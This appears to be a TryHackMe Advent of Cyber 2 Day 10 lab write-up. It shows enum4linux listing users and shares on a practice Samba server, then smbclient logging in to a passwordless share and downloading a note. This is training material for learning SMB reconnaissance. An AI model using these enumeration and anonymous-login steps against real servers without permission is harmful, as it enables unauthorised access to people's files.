# TRYHACKME: ADVENTOFCYBER2 [DAY 10] NETWORKING - Don't be so sElfish - Prelude

```
The Best Festival Company (TBFC) has since upscaled its IT infrastructure after last year's attack for all the other elves to use, including a VPN server and a few other services. You breathe a sigh of relief..."That's it, Me, Elf McEager saved the Christmas of 2020! I can't wait to---"
But suddenly, a cold shiver runs down your spine, interrupting your monologue...

You suddenly recall that Elf McSkidy had set up a Samba file server just before the attack occurred - could this have been hacked too?!  What about our data...Oh no, quick! Find out what usernames may have been leaked and attempt to login to the server yourself, noting down any vulnerabilities found to report back to Elf McSkidy.
```

TOPICS: SMB and NFS, Samba Server

### QUESTIONS

Using enum4linux, how many users are there on the Samba server?

```
$ enum4linux -U 10.10.129.147

 ============================== 
|    Users on 10.10.129.147    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy       Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager       Name: elfmceager        Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson    Name:   Desc: 
```

Now how many "shares" are there on the Samba server?

```
$ enum4linux -S 10.10.129.147

 ========================================== 
|    Share Enumeration on 10.10.129.147    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        tbfc-hr         Disk      tbfc-hr
        tbfc-it         Disk      tbfc-it
        tbfc-santa      Disk      tbfc-santa
        IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
```

Use smbclient to try to login to the shares on the Samba server (MACHINE_IP). What share doesn't require a password?

```
$ smbclient //10.10.129.147/tbfc-santa
Enter WORKGROUP\ffb's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

Log in to this share, what directory did ElfMcSkidy leave for Santa?

```
$ smbclient //10.10.129.147/tbfc-santa
Enter WORKGROUP\ffb's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 11 21:12:07 2020
  ..                                  D        0  Wed Nov 11 20:32:21 2020
  jingle-tunes                        D        0  Wed Nov 11 21:10:41 2020
  note_from_mcskidy.txt               N      143  Wed Nov 11 21:12:07 2020

                10252564 blocks of size 1024. 5190556 blocks available
smb: \> get note_from_mcskidy.txt
getting file \note_from_mcskidy.txt of size 143 as note_from_mcskidy.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
